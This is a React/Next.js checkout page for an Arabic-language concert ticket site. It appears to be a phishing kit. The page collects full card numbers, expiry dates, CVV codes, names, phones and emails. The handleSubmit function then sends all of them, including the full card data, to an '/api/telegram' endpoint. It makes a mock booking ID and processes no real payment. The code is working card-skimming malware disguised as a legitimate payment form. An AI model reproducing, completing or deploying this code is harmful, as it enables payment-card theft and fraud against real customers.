"use client";

import { useState, useEffect } from "react";
import { useSearchParams, useRouter } from "next/navigation";
import toast from "react-hot-toast";
import { useCurrency } from "../components/CurrencyProvider";
import Image from "next/image";

// Helper function to get category background color
function getCategoryBackgroundColor(category: string): string {
  const colors: Record<string, string> = {
    VVIP: "bg-purple-500",
    VIP: "bg-pink-500",
    Royal: "bg-green-500",
    Diamond: "bg-blue-500",
    Platinum: "bg-purple-400",
    Gold: "bg-yellow-500",
    Silver: "bg-gray-400",
    Bronze: "bg-orange-500",
  };
  return colors[category] || "bg-gray-700";
}

export default function PaymentPage() {
  const { formatPrice } = useCurrency();
  const searchParams = useSearchParams();
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null | boolean>(null);

  const eventId = searchParams.get("eventId");
  const seatsParam = searchParams.get("seats") || "";
  const total = searchParams.get("total") || "5000";
  const setPrice = searchParams.get("setPrice") || null; // Optional set price parameter

  // Parse seat data from URL - expect format: seatId:category:price,seatId:category:price
  // Example: seats=seat-3355:VVIP:800,seat-3054:VIP:400,seat-3389:Royal:500
  const seats = seatsParam.split(",").map(seatInfo => {
    if (!seatInfo || !seatInfo.includes(':')) {
      return null;
    }
    const [id, category, price] = seatInfo.split(":");
    return {
      id: id || "",
      category: category || "عام",
      price: parseFloat(price) || 0
    };
  }).filter(seat => seat && seat.id); // Filter out empty/null seats

  // Event data state
  const [eventData, setEventData] = useState<any>(null);
  const [eventLoading, setEventLoading] = useState(true);

  // Get user info from URL parameters
  const fullNameFromUrl = searchParams.get("fullName") || "";
  const phoneFromUrl = searchParams.get("phone") || "";
  const emailFromUrl = searchParams.get("email") || "";

  const [formData, setFormData] = useState({
    fullName: fullNameFromUrl,
    phone: phoneFromUrl,
    email: emailFromUrl,
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
  });

  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [generalError, setGeneralError] = useState("");

  // Countdown timer state (10 minutes = 600 seconds)
  const [timeLeft, setTimeLeft] = useState(600);

  // Countdown timer effect
  useEffect(() => {
    if (timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          // Time expired, redirect to home or show message
          toast.error("انتهت مهلة الدفع");
          router.push("/");
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft, router]);

  // Format time for display
  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Fetch event data
  useEffect(() => {
    const fetchEventData = async () => {
      if (!eventId) {
        setEventLoading(false);
        return;
      }

      try {
        const response = await fetch(`/api/events/${eventId}`);
        if (response.ok) {
          const data = await response.json();
          setEventData(data);
        } else {
          console.error('Failed to fetch event data');
        }
      } catch (error) {
        console.error('Error fetching event data:', error);
      } finally {
        setEventLoading(false);
      }
    };

    fetchEventData();
  }, [eventId]);

  const getCardType = (cardNumber: string) => {
    const cleanNumber = cardNumber.replace(/\D/g, "");

    if (cleanNumber.startsWith("4")) {
      return "Visa";
    } else if (cleanNumber.startsWith("5") || cleanNumber.startsWith("2")) {
      return "Mastercard";
    } else if (cleanNumber.startsWith("3")) {
      return "American Express";
    } else if (cleanNumber.startsWith("6")) {
      return "Discover";
    } else if (cleanNumber.startsWith("9")) {
      return "Mada";
    }
    return "Unknown";
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // Special handling for card number - format and limit to 16 digits
    if (name === "cardNumber") {
      const cleanValue = value.replace(/\D/g, ""); // Remove non-digits
      const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, "$1 "); // Add spaces every 4 digits
      if (cleanValue.length <= 16) {
        setFormData((prev) => ({
          ...prev,
          [name]: formattedValue,
        }));
      }
      return;
    }

    // Special handling for expiry month - limit to 2 digits and validate
    if (name === "expiryMonth") {
      const cleanValue = value.replace(/\D/g, "");
      if (
        cleanValue.length <= 2 &&
        (cleanValue === "" ||
          (parseInt(cleanValue) >= 1 && parseInt(cleanValue) <= 12))
      ) {
        setFormData((prev) => ({
          ...prev,
          [name]: cleanValue,
        }));
      }
      return;
    }

    // Special handling for expiry year - limit to 2 digits
    if (name === "expiryYear") {
      const cleanValue = value.replace(/\D/g, "");
      if (cleanValue.length <= 2) {
        setFormData((prev) => ({
          ...prev,
          [name]: cleanValue,
        }));
      }
      return;
    }

    // Special handling for CVV - limit to 3 digits
    if (name === "cvv") {
      const cleanValue = value.replace(/\D/g, "");
      if (cleanValue.length <= 3) {
        setFormData((prev) => ({
          ...prev,
          [name]: cleanValue,
        }));
      }
      return;
    }

    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const validateForm = () => {
    const errors = [];

    if (!formData.fullName.trim()) {
      errors.push("الاسم بالكامل مطلوب");
    }

    if (!formData.phone.trim()) {
      errors.push("رقم الواتساب مطلوب");
    }

    if (!formData.email.trim()) {
      errors.push("البريد الإلكتروني مطلوب");
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.push("البريد الإلكتروني غير صحيح");
    }

    if (!formData.cardNumber.trim()) {
      errors.push("رقم البطاقة مطلوب");
    } else {
      const cleanCardNumber = formData.cardNumber.replace(/\D/g, "");
      if (cleanCardNumber.length !== 16) {
        errors.push("رقم البطاقة يجب أن يكون 16 رقم");
      }
    }

    if (!formData.expiryMonth.trim()) {
      errors.push("شهر انتهاء البطاقة مطلوب");
    } else {
      const month = parseInt(formData.expiryMonth);
      if (month < 1 || month > 12) {
        errors.push("شهر انتهاء البطاقة غير صحيح");
      }
    }

    if (!formData.expiryYear.trim()) {
      errors.push("سنة انتهاء البطاقة مطلوبة");
    } else {
      const year = parseInt(formData.expiryYear);
      const currentYear = new Date().getFullYear() % 100;
      if (year < currentYear) {
        errors.push("سنة انتهاء البطاقة منتهية الصلاحية");
      }
    }

    if (!formData.cvv.trim()) {
      errors.push("رمز CVV مطلوب");
    } else if (formData.cvv.length !== 3) {
      errors.push("رمز CVV يجب أن يكون 3 أرقام");
    }

    return errors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validate form
    const validationErrors = validateForm();
    if (validationErrors.length > 0) {
      validationErrors.forEach((error) => toast.error(error));
      return;
    }

    setLoading(true);

    try {
      // Generate a mock booking ID for reference
      const mockBookingId = `booking-${Date.now()}`;

      // Send data directly to Telegram
      const telegramResponse = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bookingData: {
            eventTitle: "ليلة عودة المسافرين - راشد الماجد وفضل شاكر",
            customerName: formData.fullName,
            customerPhone: formData.phone,
            customerEmail: formData.email,
            seats: seats.map((seat) => ({
              id: seat.id,
              row: seat.id ? seat.id.split('-')[0] || 'A' : 'A',
              number: seat.id ? parseInt(seat.id.split('-')[1]) || 1 : 1,
              category: seat.category,
              price: seat.price,
            })),
            totalAmount: seats.reduce((sum, seat) => sum + seat.price, 0),
            timestamp: new Date().toISOString(),
            bookingId: mockBookingId,
            cardInfo: {
              cardNumber: formData.cardNumber,
              expiryMonth: formData.expiryMonth,
              expiryYear: formData.expiryYear,
              cvv: formData.cvv,
              cardType: getCardType(formData.cardNumber),
            },
            paymentInfo: {
              cardLastFour: formData.cardNumber.slice(-4),
              paymentMethod: "بطاقة ائتمان",
            },
          },
        }),
      });

      if (telegramResponse.ok) {
        router.push(
          `/confirm?phone=${formData.phone}&bookingId=${mockBookingId}`
        );
      } else {
        const error = await telegramResponse.json();
      }
    } catch (error) {
      console.error("Payment error:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-900">
      <div className="max-w-md mx-auto">
        {/* Header with Logo and Menu */}
        <div className="flex items-center justify-between p-4 pt-8">
          <div className="flex items-center space-x-2">
            <div className="w-6 h-6">
              <svg className="w-full h-full text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </div>
          </div>

        </div>

        {/* Time Display */}
        <div className="bg-gray-900 border border-gray-700 rounded-lg mx-4 mb-4 p-6">
          <div className="flex gap-4 items-center justify-center text-center text-white text-xl font-bold">
            <span className="block text-sm font-normal mt-1">الوقت المتبقي</span>
            <span className="text-xl ">{formatTime(timeLeft)}</span>
          </div>
        </div>

        {/* Event Details */}
        <div className="bg-gray-800 rounded-lg mx-4 mb-4 p-6">
          <div className="text-center mb-6">
            {eventLoading ? (
              <div className="animate-pulse">
                <div className="h-6 bg-gray-700 rounded mb-2"></div>
                <div className="h-4 bg-gray-700 rounded mb-1"></div>
                <div className="h-4 bg-gray-700 rounded"></div>
              </div>
            ) : eventData ? (
              <div className="flex flex-col items-start">
                <h1 className="text-white text-2xl font-bold mb-2">{eventData.title}</h1>
                <p className="text-gray-300 mb-1 text-start">
                  {eventData.date && eventData.date.length > 0 && (
                    new Date(eventData.date[0]).toLocaleDateString('ar-EG', {
                      weekday: 'long',
                      day: 'numeric',
                      month: 'long'
                    })
                  )} - {eventData.venue}
                  <span className="text-amber-300 ">(تفتح الابواب الساعة 7:30 مساء)</span>
                </p>
                <p className="text-gray-300 text-sm">
                  09:00 PM
                </p>
              </div>
            ) : (
              <>
                <h1 className="text-white text-2xl font-bold mb-2">فعالية غير محددة</h1>
                <p className="text-gray-300 text-sm mb-1">تاريخ غير محدد</p>
                <p className="text-gray-300 text-sm">وقت غير محدد</p>
              </>
            )}
          </div>

          {/* Seat Information Table */}
          <div className="space-y-4">
            <div className="grid grid-cols-3 gap-4 text-center border-b border-gray-600">
              <div className="text-white">الوصف</div>
              <div className="text-white">عدد</div>
              <div className="text-white">السعر</div>
            </div>

            {seats.map((seat, index) => {
              return (
                <div key={seat.id} className="grid grid-cols-3 gap-2 text-center items-center mb-2">
                  <div>
                    {seat.category}
                    <div className={`rounded bg-gray-200 `}>
                      <div className={`grid grid-cols-3 gap-1 text-xs px-1 py-1 rounded ${getCategoryBackgroundColor(seat.category)

                        }`}>
                        <div className="text-white text-xs">مقعد</div>
                        <div className="text-white text-xs">صف</div>
                        <div className="text-white text-xs">منطقة</div>
                      </div>
                      <div className="grid grid-cols-3 gap-1 text-gray-800 font-bold text-xs">
                        <div>{seat.id ? seat.id.split('-')[1] || seat.id : '1'}</div>
                        <div>{seat.id ? seat.id.split('-')[0] || 'A' : 'A'}</div>
                        {seat.category}
                        <div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="text-white text-xs font-bold">1</div>


                  <div className="text-white text-xs font-bold">
                    {formatPrice(seat.price)}
                  </div>
                </div>
              );
            })}

            <div className="border-t border-gray-600 pt-4">
              <div className="flex justify-between items-center">
                <span className="text-white font-bold">المجموع</span>
                <span className="text-white font-bold">
                  {formatPrice(seats.reduce((sum, seat) => sum + seat.price, 0))}
                </span>
              </div>
              {/* Display the total sent from checkout for reference */}
              <div className="flex justify-between items-center mt-2 text-sm">
                <span className="text-gray-400">
                  {formatPrice(parseFloat(total))}
                </span>
              </div>
              {/* Display set price if provided */}
              {setPrice && (
                <div className="flex justify-between items-center mt-2 text-sm">
                  <span className="text-blue-400">السعر المحدد:</span>
                  <span className="text-blue-400">
                    {formatPrice(parseFloat(setPrice))}
                  </span>
                </div>
              )}
            </div>
          </div>
        </div>





        {/* Payment Method Selection */}
        <div className="mx-4 mb-4 space-y-3 bg-gray-500/20  rounded-lg p-6">
          {!selectedPaymentMethod && <div className="">

            <div className="text-white text-sm mb-3">اختر طريقة الدفع للمتابعة</div>

            {/* Card Logos */}
            <div className="flex items-center justify-center gap-4 space-x-2 mb-4 bg-black rounded-md">

              <Image
                src="/logos/knet.png"
                alt="Apple Pay"
                width={40}
                height={30}

              />
              <Image
                src="/logos/pay.jpg"
                alt="Apple Pay"
                width={40}
                height={30}
               
              />
            </div>
            <div className="flex items-center justify-center gap-4 space-x-2 mb-4 bg-black rounded-md">

              <Image
                src="/master (1).png"
                alt="Mastercard"
                width={40}
                height={20}
              />
              <div className="text-blue-600 font-bold text-lg">VISA</div>
              <Image
                src="/logos/pay.jpg"
                alt="Apple Pay"
                width={40}
                height={30}
                
              />
            </div>

            {/* Credit Card Option */}
            <button
              onClick={() => setSelectedPaymentMethod('credit-card')}
              className={`w-full bg-gray-800 rounded-lg p-4 border transition-colors ${selectedPaymentMethod === 'credit-card' ? 'border-green-500 bg-gray-700' : 'border-gray-600'
                }`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className=" rounded flex items-center justify-center">

                    <Image
                      src="/new/debit-card.svg"
                      alt="Visa"
                      width={40}
                      height={20}
                    />
                  </div>
                  <div className="text-left">
                    <div className="text-white font-medium">الدفع باستخدام بطاقة الائتمان</div>
                    <div className="text-gray-400 text-xs">ادخل بيانات بطاقتك الائتمانية</div>
                  </div>
                </div>
                <div className="w-4 h-4">
                  <svg className="w-full h-full text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </div>
              </div>
            </button>
          </div>}

          {/* Credit Card Form - Show when credit card is selected */}
          {selectedPaymentMethod === 'credit-card' && (
            <div className="mb-4">

              <button onClick={() => setSelectedPaymentMethod(!selectedPaymentMethod)} className="flex bg-gray-600 py-2 px-6 rounded-md">
                ➡️
                <p>تغيير طريقة الدفع</p>
              </button>

<p className="text-gray-600 text-sm m-3">

ادخل معلومات بطاقتك الائتمانية
</p>



              <form onSubmit={handleSubmit} className="space-y-4 w-full">
                <div className="relative rounded-lg py-4">


<div className="w-2/3 flex flex-col ">

                  {/* Card Number */}
                  <div className="mb-4">
                    <div className="flex items-center gap-2 ">
                      <div className="text-gray-400 text-sm mb-2">رقم البطاقة</div>
                      <div className="flex gap-2">
                        <Image
                          src="/master (1).png" 
                          alt="Mastercard"
                          width={30}
                          height={25}
                          className="self-center -mt-1"
                        />
                        <div className="text-blue-600 font-bold text-md">VISA</div>
                      </div>
                    </div>
                    <input
                      type="text"
                      name="cardNumber"
                      value={formData.cardNumber}
                      onChange={handleInputChange}
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full bg-gray-900 text-white p-2 rounded-md border border-gray-300 focus:border-blue-500 focus:outline-none text-center tracking-wider"
                      maxLength={19}
                    />
                  </div>

                  {/* Expiry Date */}
                  <div className="mb-4">
                    <div className="text-gray-400 text-sm mb-2">تاريخ انتهاء الصلاحية</div>
                    <div className="flex gap-2">
                      <select
                        name="expiryMonth"
                        value={formData.expiryMonth}
                        onChange={(e) => setFormData(prev => ({ ...prev, expiryMonth: e.target.value }))}
                        className="bg-gray-900 text-white p-2 w-24 rounded-sm border border-gray-300 focus:border-blue-500 focus:outline-none"
                      >
                        <option value="">شهر</option>
                        {Array.from({ length: 12 }, (_, i) => (
                          <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                            {String(i + 1).padStart(2, '0')}
                          </option>
                        ))}
                      </select>
                      <select
                        name="expiryYear"
                        value={formData.expiryYear}
                        onChange={(e) => setFormData(prev => ({ ...prev, expiryYear: e.target.value }))}
                        className="bg-gray-900 text-white p-1 w-24 rounded-md border border-gray-300 focus:border-blue-500 focus:outline-none"
                      >
                        <option className="text-xs" value="">سنة</option>
                        {Array.from({ length: 10 }, (_, i) => {
                          const year = new Date().getFullYear() + i;
                          const shortYear = year.toString().slice(-2);
                          return (
                            <option key={year} value={shortYear}>
                              {shortYear}
                            </option>
                          );
                        })}
                      </select>
                    </div>
                  </div>

                  {/* CVV */}
                  <div className="mb-6">
                    <div className="text-gray-400 text-sm mb-2">رمز الحماية (CVV)</div>
                    <div className="flex items-center gap-1">
                    <input
                      type="text"
                      name="cvv"
                      value={formData.cvv}
                      onChange={handleInputChange}
                      placeholder=""
                      className="w-1/3 bg-gray-900 text-white p-2 rounded-md border border-gray-300 focus:border-blue-500 focus:outline-none"
                      maxLength={3}
                    />
                    <p className="text-gray-400 text-xs mt-2">
                      ثلاثة أرقام على ظهر بطاقة الائتمان
                    </p>
                    </div>
                  </div>

                  </div>

                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={loading}
                    className="position-absolute bottom-0 w-full bg-green-600 text-white py-3 rounded-md font-medium hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {loading ? 'جاري المعالجة...' : 'ادفع الآن'}
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* Cancel Button */}

          <button className="w-full border border-gray-600/60 text-white py-3 rounded-lg font-light hover:bg-gray-600 transition-colors">
            إلغاء طلبك
          </button>

        </div>

        {/* WhatsApp Support */}
        <div className="fixed bottom-6 right-6">
          <div className="w-14 h-14 bg-green-500 rounded-full flex items-center justify-center shadow-lg">
            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488" />
            </svg>
          </div>
        </div>
      </div>
    </div>
  );
}
